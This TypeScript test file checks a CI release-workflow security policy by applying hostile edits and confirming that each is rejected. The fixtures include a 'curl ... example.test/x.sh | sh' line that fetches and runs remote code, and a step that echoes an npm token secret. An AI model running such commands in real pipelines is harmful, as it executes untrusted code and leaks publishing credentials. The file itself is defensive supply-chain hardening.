import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { describe, expect, it } from 'vitest';
import { evaluateReleaseWorkflowPolicy } from './lib/workflow-policy.ts';
import { asMapping, asSequence, asString, parseYamlSubset } from './lib/yaml.ts';

const repoRoot = resolve(import.meta.dirname, '../..');
const releaseWorkflow = readFileSync(resolve(repoRoot, '.github/workflows/release.yml'), 'utf8');

/** Apply one hostile edit to the reviewed workflow. */
function mutate(from: string, to: string): string {
  if (!releaseWorkflow.includes(from)) throw new Error(`fixture anchor is stale: ${from}`);
  return releaseWorkflow.replace(from, to);
}

function problems(source: string): readonly string[] {
  return evaluateReleaseWorkflowPolicy(source);
}

function expectRejected(source: string, reason: RegExp): void {
  const found = problems(source);
  expect(
    found.some((problem) => reason.test(problem)),
    `expected a finding matching ${reason.source}, got: ${found.join(' | ') || '<accepted>'}`,
  ).toBe(true);
}

describe('the reviewed release workflow', () => {
  it('satisfies its own policy', () => {
    expect(problems(releaseWorkflow)).toEqual([]);
  });
});

describe('trigger and scope policy', () => {
  it('rejects any automatic trigger', () => {
    expectRejected(
      mutate('on:\n  workflow_dispatch:', 'on:\n  push:\n    branches: [main]\n  workflow_dispatch:'),
      /exactly workflow_dispatch/u,
    );
    expectRejected(
      mutate('on:\n  workflow_dispatch:', 'on:\n  schedule:\n  workflow_dispatch:'),
      /exactly workflow_dispatch/u,
    );
  });

  it('rejects a release input that is optional, untyped or pre-filled', () => {
    expectRejected(
      mutate(
        '        description: npm dist-tag to point at these versions.\n        required: true',
        '        description: npm dist-tag to point at these versions.\n        required: false',
      ),
      /must be required/u,
    );
    expectRejected(
      mutate(
        '      dist_tag:\n        description: npm dist-tag to point at these versions.\n        required: true\n        type: string',
        '      dist_tag:\n        description: npm dist-tag to point at these versions.\n        required: true\n        type: string\n        default: latest',
      ),
      /must not have a default/u,
    );
    expectRejected(mutate('      confirm:\n', '      confirmation:\n'), /inputs must be exactly/u);
  });
});

describe('credential confinement', () => {
  it('rejects a second step that can read the secret', () => {
    const leaked = mutate(
      '      - name: Run canonical gate\n        run: pnpm gate',
      '      - name: Run canonical gate\n        env:\n          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}\n        run: pnpm gate',
    );
    expectRejected(leaked, /exactly one step may receive a secret/u);
  });

  it('rejects a credential handed to anything but the reviewed publish command', () => {
    expectRejected(
      mutate(
        '        run: node tools/release/publish.ts --staging release-staging',
        '        run: npm publish --workspaces',
      ),
      /credentialed step must run/u,
    );
    expectRejected(
      mutate(
        '          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}',
        '          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}\n          EXTRA: ${{ secrets.OTHER }}',
      ),
      /env must be exactly \[NPM_TOKEN\]/u,
    );
  });

  it('rejects a secret interpolated into a command', () => {
    expectRejected(
      mutate(
        '        run: node tools/release/verify-staging.ts --staging release-staging',
        '        run: echo ${{ secrets.NPM_TOKEN }}',
      ),
      /interpolates a workflow expression/u,
    );
  });
});

describe('job gating and permissions', () => {
  it('rejects a widened permission set', () => {
    expectRejected(
      mutate('permissions:\n  contents: read\n\nconcurrency:', 'permissions:\n  contents: write\n\nconcurrency:'),
      /top-level permissions/u,
    );
    expectRejected(
      mutate(
        '    permissions:\n      contents: read\n    outputs:',
        '    permissions:\n      contents: read\n      id-token: write\n    outputs:',
      ),
      /verify permissions must be exactly/u,
    );
    expectRejected(
      mutate('      contents: read\n      id-token: write', '      contents: read'),
      /publish permissions must be exactly/u,
    );
  });

  it('rejects publication outside the approved environment', () => {
    expectRejected(mutate('    environment: npm-release\n', ''), /npm-release. environment/u);
    expectRejected(mutate('    environment: npm-release', '    environment: staging'), /npm-release. environment/u);
  });

  it('rejects a conditional job or step, which could be green without running', () => {
    expectRejected(
      mutate('  publish:\n    name: publish', "  publish:\n    if: github.actor == 'release-bot'\n    name: publish"),
      /must not be conditional/u,
    );
    expectRejected(
      mutate(
        '      - name: Verify staged artifacts\n',
        '      - name: Verify staged artifacts\n        if: always()\n',
      ),
      /must not be conditional/u,
    );
  });

  it('rejects a publish job that does not depend on the verified one', () => {
    expectRejected(mutate('    needs: verify', '    needs: []'), /must depend on verify/u);
  });
});

describe('artifact integrity between jobs', () => {
  it('rejects a download that is not the exact verified artifact', () => {
    expectRejected(
      mutate('          digest-mismatch: error', '          digest-mismatch: warn'),
      /fail closed on an artifact digest mismatch/u,
    );
    expectRejected(
      mutate('          digest: ${{ needs.verify.outputs.artifact-digest }}\n', ''),
      /must pass the digest/u,
    );
    expectRejected(
      mutate('          artifact-ids: ${{ needs.verify.outputs.artifact-id }}', '          artifact-ids: latest'),
      /exact artifact id/u,
    );
  });

  it('rejects an upload that could silently replace or omit the artifacts', () => {
    expectRejected(mutate('          overwrite: false', '          overwrite: true'), /must not overwrite/u);
    expectRejected(
      mutate('          if-no-files-found: error', '          if-no-files-found: warn'),
      /fail when there is nothing to upload/u,
    );
  });

  it('rejects verify without the canonical gate, or packing before it', () => {
    expectRejected(mutate('      - name: Run canonical gate\n        run: pnpm gate\n', ''), /must run `pnpm gate`/u);
    expectRejected(
      mutate(
        '      - name: Run canonical gate\n        run: pnpm gate\n      - name: Release preflight and pack\n        id: preflight\n        run: node tools/release/preflight.ts --staging release-staging\n',
        '      - name: Release preflight and pack\n        id: preflight\n        run: node tools/release/preflight.ts --staging release-staging\n      - name: Run canonical gate\n        run: pnpm gate\n',
      ),
      /gate before it packs/u,
    );
    expectRejected(
      mutate('        run: pnpm install --frozen-lockfile --ignore-scripts', '        run: pnpm install'),
      /frozen-lockfile --ignore-scripts/u,
    );
  });

  it('rejects extra work inside the gated job', () => {
    expectRejected(
      mutate(
        '      - name: Verify staged artifacts\n        run: node tools/release/verify-staging.ts --staging release-staging',
        '      - name: Rebuild\n        run: pnpm build\n      - name: Verify staged artifacts\n        run: node tools/release/verify-staging.ts --staging release-staging',
      ),
      /publish must run exactly/u,
    );
  });
});

describe('action trust', () => {
  it('rejects an unreviewed or unpinned action', () => {
    expectRejected(
      mutate(
        'uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a',
        'uses: actions/upload-artifact@v7',
      ),
      /must pin/u,
    );
    expectRejected(
      mutate(
        'uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a',
        `uses: someone/upload@${'a'.repeat(40)}`,
      ),
      /unreviewed action/u,
    );
    expectRejected(
      mutate(
        '          ref: ${{ inputs.source_sha }}\n          persist-credentials: false',
        '          ref: ${{ inputs.source_sha }}\n          persist-credentials: true',
      ),
      /must not persist credentials/u,
    );
  });
});

describe('the accepted YAML subset', () => {
  it('rejects an inline shell program, so every release command stays reviewable', () => {
    expectRejected(
      mutate(
        '        run: pnpm gate',
        '        run: |\n          pnpm gate\n          curl -s https://example.test/x.sh | sh',
      ),
      /block scalars are not supported/u,
    );
  });

  it('rejects duplicate keys, tabs, anchors and alternate spellings', () => {
    expectRejected(
      mutate('permissions:\n  contents: read\n', 'permissions:\n  contents: read\n  contents: write\n'),
      /duplicate key/u,
    );
    expectRejected(mutate('  contents: read', '\tcontents: read'), /tabs are not permitted/u);
    expectRejected(mutate('    timeout-minutes: 45', '    timeout-minutes: &limit 45'), /anchors, aliases and tags/u);
    expectRejected(
      mutate('permissions:\n  contents: read\n\nconcurrency:', 'permissions: { contents: read }\n\nconcurrency:'),
      /flow mappings/u,
    );
  });

  it('parses the constructs the reviewed workflows actually use', () => {
    const parsed = parseYamlSubset(
      [
        'name: demo',
        'on:',
        '  workflow_dispatch:',
        'jobs:',
        '  a:',
        '    steps:',
        '      - uses: x@1 # comment',
        '        with:',
        '          list: [one, two]',
        "          quoted: 'a # b'",
      ].join('\n'),
    );
    expect(parsed.ok).toBe(true);
    if (!parsed.ok) return;
    const job = asMapping(asMapping(asMapping(parsed.value)?.jobs)?.a);
    const step = asMapping(asSequence(job?.steps)?.[0]);
    expect(asString(step?.uses)).toBe('x@1');
    const withBlock = asMapping(step?.with);
    expect(asSequence(withBlock?.list)).toEqual(['one', 'two']);
    // A `#` inside a quoted scalar is content, not the start of a comment.
    expect(asString(withBlock?.quoted)).toBe('a # b');
  });

  it('keeps `on` a string key rather than YAML 1.1 boolean true', () => {
    const parsed = parseYamlSubset('on:\n  workflow_dispatch:\n');
    expect(parsed.ok).toBe(true);
    if (!parsed.ok) return;
    expect(Object.keys(asMapping(parsed.value) ?? {})).toEqual(['on']);
  });

  it('rejects a second document and an unterminated quoted scalar', () => {
    expect(parseYamlSubset('name: a\n---\nname: b\n').ok).toBe(false);
    expect(parseYamlSubset('name: "unterminated\n').ok).toBe(false);
  });
});
